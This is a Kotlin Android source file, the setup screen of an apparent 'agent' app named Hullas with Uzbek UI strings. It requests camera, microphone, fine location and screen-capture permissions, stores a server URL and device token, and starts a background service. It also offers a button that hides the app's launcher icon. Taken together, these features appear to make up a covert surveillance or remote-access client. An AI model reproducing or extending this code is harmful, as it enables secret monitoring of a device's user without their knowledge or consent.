package org.hullas.agent

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.textfield.TextInputEditText

class SetupActivity : AppCompatActivity() {
    private val perms = buildList {
        add(Manifest.permission.CAMERA)
        add(Manifest.permission.RECORD_AUDIO)
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions(),
    ) { results ->
        val ok = results.values.all { it }
        toast(if (ok) "Ruxsatlar berildi" else "Ba'zi ruxsatlar rad etildi")
    }

    private val screenshotLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult(),
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            ScreenshotPermissionActivity.handleResult(this, result.resultCode, result.data!!)
            toast("Ekran ruxsati berildi")
        } else {
            toast("Ekran ruxsati rad etildi")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup)

        val serverUrl = findViewById<TextInputEditText>(R.id.serverUrl)
        val deviceToken = findViewById<TextInputEditText>(R.id.deviceToken)
        serverUrl.setText(Prefs.serverUrl(this))
        deviceToken.setText(Prefs.deviceToken(this))

        findViewById<Button>(R.id.btnPermissions).setOnClickListener {
            permLauncher.launch(perms)
        }

        findViewById<Button>(R.id.btnScreenshot).setOnClickListener {
            if (ProjectionHelper.hasSavedPermission(this)) {
                toast("Ekran ruxsati allaqachon berilgan. Yangilash uchun qayta bosing.")
            }
            screenshotLauncher.launch(
                ScreenshotPermissionActivity.createIntent(this),
            )
        }

        findViewById<Button>(R.id.btnStart).setOnClickListener {
            val url = serverUrl.text?.toString()?.trim() ?: ""
            val token = deviceToken.text?.toString()?.trim() ?: ""
            if (url.isBlank() || token.isBlank()) {
                toast("Server URL va Token kiriting")
                return@setOnClickListener
            }
            Prefs.save(this, url, token)
            HullasService.start(this)
            toast("Agent ishga tushdi")
            moveTaskToBack(true)
        }

        findViewById<Button>(R.id.btnHide).setOnClickListener {
            hideLauncherIcon()
            toast("Ilova yashirildi. Sozlash: telefon qidiruvidan 'Hullas'")
        }

        if (Prefs.isConfigured(this)) {
            HullasService.start(this)
        }
    }

    private fun hideLauncherIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, SetupActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP,
        )
    }

    private fun toast(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
    }
}